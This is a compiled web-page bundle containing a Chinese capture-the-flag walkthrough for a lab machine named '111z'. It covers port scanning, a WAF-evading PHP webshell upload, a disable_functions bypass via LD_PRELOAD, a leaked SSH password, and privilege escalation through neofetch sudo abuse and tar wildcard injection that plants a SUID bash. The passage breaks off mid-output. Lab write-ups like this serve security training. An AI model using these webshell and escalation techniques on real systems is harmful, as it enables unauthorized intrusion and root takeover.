(window.webpackJsonp=window.webpackJsonp||[]).push([[153],{516:function(a,s,t){"use strict";t.r(s);var e=t(11),r=Object(e.a)({},(function(){var a=this,s=a._self._c;return s("ContentSlotsDistributor",{attrs:{"slot-key":a.$parent.slotKey}},[s("h2",{attrs:{id:"信息收集"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#信息收集"}},[a._v("#")]),a._v(" 信息收集")]),a._v(" "),s("h3",{attrs:{id:"存活主机扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#存活主机扫描"}},[a._v("#")]),a._v(" 存活主机扫描")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("┌──"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("npc㉿kali"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("-"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("~/mazesec/111z"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("\n└─$ "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" arp-scan "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-I")]),a._v(" eth1 "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".56.0/24\n\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".56.141  08:00:27:50:0d:5b       PCS Systemtechnik GmbH\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br")])]),s("h3",{attrs:{id:"tcp全端口扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#tcp全端口扫描"}},[a._v("#")]),a._v(" tcp全端口扫描")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("┌──"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("npc㉿kali"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("-"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("~/mazesec/111z"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("\n└─$ nmap -p- "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-sT")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("192.168")]),a._v(".56.141\n\nPORT   STATE SERVICE\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("22")]),a._v("/tcp "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("open")]),a._v("  "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("ssh")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("80")]),a._v("/tcp "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("open")]),a._v("  http\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br")])]),s("h3",{attrs:{id:"目录扫描"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#目录扫描"}},[a._v("#")]),a._v(" 目录扫描")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("┌──"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("npc㉿kali"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v("-"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),a._v("~"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v("\n└─$ dirsearch "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" http://192.168.56.141    \n\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("22")]),a._v(":11:33"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("200")]),a._v(" -   86B  - /upload.php\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("22")]),a._v(":11:33"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("301")]),a._v(" -  318B  - /uploads  -"),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v("  http://192.168.56.141/uploads/\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("22")]),a._v(":11:33"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("200")]),a._v(" -  407B  - /uploads/\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br")])]),s("h2",{attrs:{id:"_80-端口-web-服务探测"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#_80-端口-web-服务探测"}},[a._v("#")]),a._v(" 80 端口 web 服务探测")]),a._v(" "),s("p",[a._v("在线图床上传的web服务")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/1.png",alt:""}})]),a._v(" "),s("p",[a._v("（最后一版做了点小调整，ip变动忽略）")]),a._v(" "),s("p",[a._v("前端js里允许上传的扩展名只有图片格式，上传图片，burp抓包，发送到，后端会检测文件内容，使用"),s("code",[a._v("eval")]),a._v("、"),s("code",[a._v("system")]),a._v("等危险函数名时会上传失败")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/3.png",alt:""}})]),a._v(" "),s("p",[a._v("同时还会检测分号;，php允许使用"),s("code",[a._v("?>")]),a._v("直接最后一个php语句不使用分号结束，可以通过多个php标签，实现执行多条php语句。返回提示，php对函数名大小写不敏感，使用大写可以绕过")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/4.png",alt:""}})]),a._v(" "),s("p",[a._v("访问页面报500，可能因为php配置禁用了函数，php在解析时发现函数不可用就会报错，后端返回错误码500")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/5.png",alt:""}})]),a._v(" "),s("p",[a._v("php官方的解释里有讲，"),s("code",[a._v("eval")]),a._v("并不是函数，而是一个语言构造器，disable_funtions里也ban不了这个，如果你用system函数遇到500，换成大小混写的"),s("code",[a._v("eval")]),a._v("试试")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/6.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/7.png",alt:""}})]),a._v(" "),s("p",[a._v("可以提前上传个文件读取upload.php的源码，减少waf命中，增加马子存活率")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/26.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/29.png",alt:""}})]),a._v(" "),s("p",[a._v("因为存在函数禁用比较严格，执行命令困难，我和MJ讨论两个方案：")]),a._v(" "),s("ul",[s("li",[a._v("暂不命令执行，通过函数扫描读取文件内容，收集信息")]),a._v(" "),s("li",[a._v("劫持LD_PRELOAD，绕过disable_functions实现命令执行")])]),a._v(" "),s("p",[a._v("在此感谢MJ的测试和帮助")]),a._v(" "),s("h2",{attrs:{id:"文件上传getshell"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#文件上传getshell"}},[a._v("#")]),a._v(" 文件上传getshell")]),a._v(" "),s("h3",{attrs:{id:"方案0-蚁剑直接读取文件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#方案0-蚁剑直接读取文件"}},[a._v("#")]),a._v(" 方案0：蚁剑直接读取文件")]),a._v(" "),s("p",[a._v("命令执行函数被禁用不影响文件读取以及目录扫描等功能，使用蚁剑直接依次查看目录及文件内容，可以发现 llpass.txt 里存放的ll用户 ssh 密码")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/31.png",alt:""}})]),a._v(" "),s("h3",{attrs:{id:"方案1-上传webshell读取文件"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#方案1-上传webshell读取文件"}},[a._v("#")]),a._v(" 方案1：上传webshell读取文件")]),a._v(" "),s("p",[a._v("作为一个折中的方案，在不执行命令的条件下，仅靠webshell扫描指定目录、读取敏感文件，收集信息。")]),a._v(" "),s("div",{staticClass:"language-php line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-php"}},[s("code",[s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$dir")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$file")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$_GET")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("[")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("2")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("]")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[a._v("'<pre>'")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("print_r")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("scandir")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$dir")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token keyword"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string single-quoted-string"}},[a._v("'</pre>'")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token php language-php"}},[s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("<?php")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("highlight_file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),s("span",{pre:!0,attrs:{class:"token variable"}},[a._v("$file")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),s("span",{pre:!0,attrs:{class:"token delimiter important"}},[a._v("?>")])]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br")])]),s("p",[a._v("效果图如下：")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/27.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/28.png",alt:""}})]),a._v(" "),s("p",[a._v("扫描 "),s("code",[a._v("/opt")]),a._v(" 目录，发现 "),s("code",[a._v("llpass.txt")]),a._v(" 文件，拿到 ll 用户的 ssh 密码")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/30.png",alt:""}})]),a._v(" "),s("h3",{attrs:{id:"方案2-绕过disable-functions执行命令"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#方案2-绕过disable-functions执行命令"}},[a._v("#")]),a._v(" 方案2：绕过disable_functions执行命令")]),a._v(" "),s("p",[a._v("上传后可以解析执行")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/8.png",alt:""}})]),a._v(" "),s("p",[a._v("几乎禁用了所有危险函数")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/2.png",alt:""}})]),a._v(" "),s("p",[a._v("因为php配置文件禁用了几乎所有命令执行函数，如果 /tmp 目录可写，并且 putenv 、mail、error_log 函数可用，可以在 /tmp 上传恶意动态链接库文件，利用 putenv 函数设置环境变量，再通过 mail 或 error_log 函数开启一个子进程加载恶意动态链接库，从而实现代码执行。")]),a._v(" "),s("p",[a._v("可以直接利用 中国蚁剑 的插件来实现绕过 disable_functions")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/9.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/10.png",alt:""}})]),a._v(" "),s("p",[a._v("检测到 putenv、error_log 可用（info.php的phpinfo页面也可以发现），选择当前webshell所在路径 "),s("code",[a._v("/var/www/html/uploads/")]),a._v("，绕过")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/11.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/12.png",alt:""}})]),a._v(" "),s("p",[a._v("新建一个webshell连接，文件名使用 .antproxy，密码还是刚刚上传的webshell密码")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/13.png",alt:""}})]),a._v(" "),s("p",[a._v("分析上传的恶意动态链接库文件，通过可见字符可以知道，这会使用php内置的web服务器监听在127.0.0.1:61147端口，web根目录设置为 /var/www/html，然后我们可以通过 生成的 .antproxy.php 与这个内置web服务器通信，实现命令执行")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("php "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-n")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-S")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("127.0")]),a._v(".0.1:61147 "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-t")]),a._v(" /var/www/html\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/maze-111z/14.png",alt:""}})]),a._v(" "),s("p",[a._v("分析 .antproxy.php 文件，可以看到发给这个 .antproxy.php 的请求会被转发到 动态链接库启动的纯净php环境里执行")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/15.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"ll-用户-ssh-凭证泄露"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#ll-用户-ssh-凭证泄露"}},[a._v("#")]),a._v(" ll 用户 ssh 凭证泄露")]),a._v(" "),s("p",[a._v("搜索近 7 天变化的文件，排除一些目录，减少噪声")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("find")]),a._v(" / "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /run "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /sys "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /proc "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /var/lib "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /dev "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /usr/share "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /var/log "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /var/cache "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-path")]),a._v(" /etc "),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("\\")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-prune")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-o")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-mtime")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-7")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-print")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[s("span",{pre:!0,attrs:{class:"token file-descriptor important"}},[a._v("2")]),a._v(">")]),a._v("/dev/null\n"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("www-data:/var/www/html/uploads"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" $ "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("cat")]),a._v(" /opt/llpass.txt\nll:Bp2tFMYfElkoMWlOUsOD1C30\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br")])]),s("p",[a._v("可以在 "),s("code",[a._v("/opt/llpass.txt")]),a._v(" 发现 ll 用户的 ssh 密码")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/16.png",alt:""}})]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/17.png",alt:""}})]),a._v(" "),s("p",[a._v("或者直接使用蚁剑 翻文件看内容不去管绕过命令执行也可以")]),a._v(" "),s("p",[a._v("ssh 登录到 ll 用户")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/18.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"sudo-权限枚举"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#sudo-权限枚举"}},[a._v("#")]),a._v(" sudo 权限枚举")]),a._v(" "),s("p",[a._v("sudo 权限枚举，发现ll用户可以无密码以 mj 用户身份运行 neofetch")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/19.png",alt:""}})]),a._v(" "),s("p",[a._v("gtfobins 里发现 neofetch 可以被滥用来提权，"),s("a",{attrs:{href:"https://gtfobins.github.io/gtfobins/neofetch/",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://gtfobins.github.io/gtfobins/neofetch/"),s("OutboundLink")],1)]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/20.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"neofetch-提权到-mj-用户"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#neofetch-提权到-mj-用户"}},[a._v("#")]),a._v(" neofetch 提权到 mj 用户")]),a._v(" "),s("p",[a._v("创建配置文件，运行neofetch指定配置文件路径，可以执行配置文件里的命令")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'exec bash'")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" /tmp/config.txt\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-u")]),a._v(" mj /usr/bin/neofetch "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("--config")]),a._v(" /tmp/config.txt\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("拿到 mj 用户的 shell")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/21.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"备份脚本审计"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#备份脚本审计"}},[a._v("#")]),a._v(" 备份脚本审计")]),a._v(" "),s("p",[a._v("mj 用户 有 root 权限 执行 "),s("code",[a._v("/opt/")]),a._v("目录下的图床备份脚本")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/22.png",alt:""}})]),a._v(" "),s("p",[a._v("脚本内容非常简单，cd、echo命令没问题，只能是"),s("code",[a._v("tar czf /tmp/backup.tar.gz *")]),a._v(" 这条命令有问题了，搜索 tar 命令相关提权文章可以找到，tar命令存在通配符注入漏洞，"),s("a",{attrs:{href:"https://www.freebuf.com/articles/system/176255",target:"_blank",rel:"noopener noreferrer"}},[a._v("https://www.freebuf.com/articles/system/176255"),s("OutboundLink")],1)]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("mj@111z:~$ "),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("cat")]),a._v(" /opt/backup/backup.sh\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("#!/bin/bash")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# 网站上传文件备份脚本")]),a._v("\n\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("cd")]),a._v(" /var/www/html/uploads\n"),s("span",{pre:!0,attrs:{class:"token function"}},[a._v("tar")]),a._v(" czf /tmp/backup.tar.gz *\n"),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v('"Backup completed"')]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br"),s("span",{staticClass:"line-number"},[a._v("3")]),s("br"),s("span",{staticClass:"line-number"},[a._v("4")]),s("br"),s("span",{staticClass:"line-number"},[a._v("5")]),s("br"),s("span",{staticClass:"line-number"},[a._v("6")]),s("br"),s("span",{staticClass:"line-number"},[a._v("7")]),s("br")])]),s("p",[a._v("使用man 命令查看 tar 的帮助，找到存在参数"),s("code",[a._v("--checkpoint-action=exec=COMMAND")]),a._v("，可以在每个检查点执行指定命令，需要有一个检查点才行，使用"),s("code",[a._v("--checkpoint=N")]),a._v("参数可以指定每N个个检查点执行一次")]),a._v(" "),s("p",[s("img",{attrs:{src:"/medias/maze-111z/23.png",alt:""}})]),a._v(" "),s("h2",{attrs:{id:"tar-命令通配符注入提权"}},[s("a",{staticClass:"header-anchor",attrs:{href:"#tar-命令通配符注入提权"}},[a._v("#")]),a._v(" tar 命令通配符注入提权")]),a._v(" "),s("p",[a._v("到 /var/www/html/uploads 目录下，创建文件名为'--checkpoint=1 --checkpoint-action=exec=sh shell.sh'、'--checkpoint=1'的两个文件")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("mj@111z:/var/www/html/uploads$ "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("''")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'--checkpoint-action=exec=sh shell.sh'")]),a._v("\nmj@111z:/var/www/html/uploads$ "),s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("''")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'--checkpoint=1'")]),a._v("\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br"),s("span",{staticClass:"line-number"},[a._v("2")]),s("br")])]),s("p",[a._v("shell.sh，实现获取一个 suid 的bash")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token builtin class-name"}},[a._v("echo")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-e")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token string"}},[a._v("'#!/bin/bash\\ncp /bin/bash /var/www/html/uploads/bash\\nchmod u+s /var/www/html/uploads/bash'")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v(">")]),a._v(" shell.sh\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[a._v("执行备份脚本")]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[s("span",{pre:!0,attrs:{class:"token function"}},[a._v("sudo")]),a._v(" /opt/backup/backup.sh\n")])]),a._v(" "),s("div",{staticClass:"line-numbers-wrapper"},[s("span",{staticClass:"line-number"},[a._v("1")]),s("br")])]),s("p",[s("img",{attrs:{src:"/medias/maze-111z/24.png",alt:""}})]),a._v(" "),s("div",{staticClass:"language-bash line-numbers-mode"},[s("pre",{pre:!0,attrs:{class:"language-bash"}},[s("code",[a._v("mj@111z:/var/www/html/uploads$ ./bash "),s("span",{pre:!0,attrs:{class:"token parameter variable"}},[a._v("-p")]),a._v(" \nbash-5.0"),s("span",{pre:!0,attrs:{class:"token comment"}},[a._v("# id    ")]),a._v("\n"),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("uid")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1001")]),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v("(")]),a._v("mj"),s("span",{pre:!0,attrs:{class:"token punctuation"}},[a._v(")")]),a._v(" "),s("span",{pre:!0,attrs:{class:"token assign-left variable"}},[a._v("gid")]),s("span",{pre:!0,attrs:{class:"token operator"}},[a._v("=")]),s("span",{pre:!0,attrs:{class:"token number"}},[a._v("1001")]),s("span",{pre:!0,attrs:{class:"token 